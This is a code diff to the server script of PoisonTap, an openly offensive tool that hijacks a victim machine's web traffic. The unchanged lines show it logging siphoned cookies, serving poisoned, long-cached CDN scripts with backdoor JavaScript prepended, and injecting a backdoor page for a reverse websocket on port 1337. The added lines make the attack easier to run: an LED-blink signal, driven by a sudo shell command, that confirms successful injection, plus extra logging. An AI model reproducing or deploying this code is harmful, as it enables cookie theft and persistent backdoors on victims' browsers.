@@ -14,6 +14,7 @@ var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
 var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
 var log_stdout = process.stdout;
 var replacejs = fs.readdirSync(__dirname + '/js');
+var blinked = false;
 var repobj = {};
 for (var i in replacejs)
 	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);
@@ -21,6 +22,36 @@ for (var i in replacejs)
 console.log = function(d) {
   log_file.write(util.format(d) + '\n');
   log_stdout.write(util.format(d) + '\n');
+};
+
+var startBlinking = function() {
+	// Configuration
+	var BLINK_MAX = 20;
+	var BLINK_SPEED = 100;
+
+	// Blinking function
+	var util = require('util'), exec = require('child_process').exec, child;
+	var oldState = 1;
+	var count = 0;
+
+	var changeLedState = function(state) {
+		oldState = state;
+		child = exec('nice -n -20 echo '+state+' | sudo tee /sys/class/leds/led0/brightness');
+	}
+
+	var blink = function() {
+		changeLedState(oldState == 1 ? 0 : 1);
+		count++;
+		
+		if (count <= BLINK_MAX + 1) {
+			setTimeout(blink, BLINK_SPEED);
+		} else {
+			changeLedState(1);
+			setTimeout(function(){changeLedState(0)},3000);
+		}
+	}
+
+	blink();
 };
 
 var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html');
@@ -46,6 +77,7 @@ var server = http.createServer(function(request, response) {
 	// cache for a very long time to poison future requests after we're gone
 	if (repobj[url])
 	{
+		console.log('>>> Known CDN');
 		response.writeHead(200, headers);
 		response.write(backdoorPreJs);
 		response.write(repobj[url]);
@@ -56,6 +88,13 @@ var server = http.createServer(function(request, response) {
 	// if this is a poisontap request, we just siphoned cookies, now drop html backdoor
 	else if (url.indexOf('/PoisonTap') != -1)
 	{
+		// Blink ACT led on RPi to know if the injection is going well
+		if (!blinked) {
+			blinked = true;
+			startBlinking();
+		}
+		
+		console.log('>>> Inject Backdoor HTML reverse ws 1337');
 		response.writeHead(200, headers);
 		response.write(backdoorHtml);
 		response.end();
@@ -65,6 +104,7 @@ var server = http.createServer(function(request, response) {
   // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
 	else
 	{
+		console.log('>>> Inject Target xhtmljs');
 		response.writeHead(200, headers);
 
 		// NOT poisontap hit, inject cross-js/html file
@@ -75,4 +115,5 @@ var server = http.createServer(function(request, response) {
 });
 
 server.listen(1337);
+console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====");
 console.log("PoisonTap is listening");
